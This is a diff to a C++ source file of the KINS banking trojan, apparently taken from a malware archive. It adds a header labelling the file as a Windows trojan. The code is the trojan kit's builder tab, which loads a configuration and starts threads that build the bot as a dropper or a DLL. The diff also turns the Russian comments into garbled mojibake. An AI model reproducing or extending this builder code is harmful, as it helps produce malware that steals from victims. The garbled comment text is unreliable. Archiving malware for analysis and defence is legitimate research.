@@ -1,3 +1,14 @@
+/*
+  name      KINS
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <shlwapi.h>
 #include <shellapi.h>
@@ -21,15 +32,15 @@
 #define WM_ENABLE_BUTTONS (WM_USER + 100)
 
 /*
-  Загрузка конфигурации.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN hwnd        - хэндл вкладки.
-  IN OUT file    - файл конфигурации.
-  OUT config     - конфигурация.
-  IN showError   - выводить ли сообщение в случаи ошибки.
+  IN hwnd        - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN OUT file    - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  OUT config     - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN showError   - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return       - true - в случаи успеха,
-                 false - в случаи провала.
+  Return       - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+                 false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool loadConfig(HWND hwnd, LPWSTR file, Config0::CFGDATA *config, bool showError)
 {
@@ -61,11 +72,11 @@ static bool loadConfig(HWND hwnd, LPWSTR file, Config0::CFGDATA *config, bool sh
 }
 
 /*
-  Включает, отключает все копки на вкладке.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN hwnd   - вкладка.
-  IN enable - true - включить,
-              false - выключить.
+  IN hwnd   - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN enable - true - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+              false - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static void enableButtons(HWND hwnd, bool enable)
 {
@@ -82,13 +93,13 @@ enum
 
 typedef struct
 {
-	BYTE switcher;			 //Определяет что собирать: 0 - дроппер/1 - длл.
-	HWND owner;              //Окно вкладки.
-	Config0::CFGDATA config; //Конфигурация.
+	BYTE switcher;			 //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ: 0 - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ/1 - пїЅпїЅпїЅ.
+	HWND owner;              //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+	Config0::CFGDATA config; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 }BUILDDATA;
 
 /*
-  Поток для процесса сборки файлов бота.
+  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
 
   IN p - BUILDDATA.
   
@@ -103,7 +114,7 @@ static DWORD WINAPI buildThread(void *p)
 	case BUILDER_DLL: BuildDll::_run(bd->owner, CWA(user32, GetDlgItem)(bd->owner, IDC_BUILDER_BUILD_OUTPUT), &bd->config, homePath); break;
 	case BUILDER_DROPPER: BuildDropper::_run(bd->owner, CWA(user32, GetDlgItem)(bd->owner, IDC_BUILDER_BUILD_OUTPUT), &bd->config, homePath); break;
 	}
-	//Выход.
+	//пїЅпїЅпїЅпїЅпїЅ.
 	Config0::_Close(&bd->config);
 	CWA(user32, SendMessageW)(bd->owner, WM_ENABLE_BUTTONS, 0, 0);
 	Mem::free(bd);
@@ -111,7 +122,7 @@ static DWORD WINAPI buildThread(void *p)
 }
 
 /*
-  Обработка вкладки.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 INT_PTR CALLBACK toolBuilderProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
 {
@@ -124,7 +135,7 @@ INT_PTR CALLBACK toolBuilderProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lPa
 			{
 				subThread = NULL;
 
-				//Выставляем строки.
+				//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 				CWA(user32, SetDlgItemTextW)(hwnd, IDC_BUILDER_SOURCE_BROWSE, Languages::get(Languages::tool_builder_source_browse));
 				CWA(user32, SetDlgItemTextW)(hwnd, IDC_BUILDER_SOURCE_EDIT, Languages::get(Languages::tool_builder_source_edit));
 				CWA(user32, SetDlgItemTextW)(hwnd, IDC_BUILDER_BUILD_TITLE, Languages::get(Languages::tool_builder_build_title));
@@ -141,7 +152,7 @@ INT_PTR CALLBACK toolBuilderProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lPa
 					CWA(user32, SetDlgItemTextW)(hwnd, IDC_BUILDER_VERSION, buf);
 				}
 				
-				//Выбираем конфиг по умолчанию.
+				//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 				{
 					Config0::CFGDATA config;
 					if(Fs::_pathCombine(configFile, homePath, L"config.txt") && loadConfig(hwnd, configFile, &config, false))
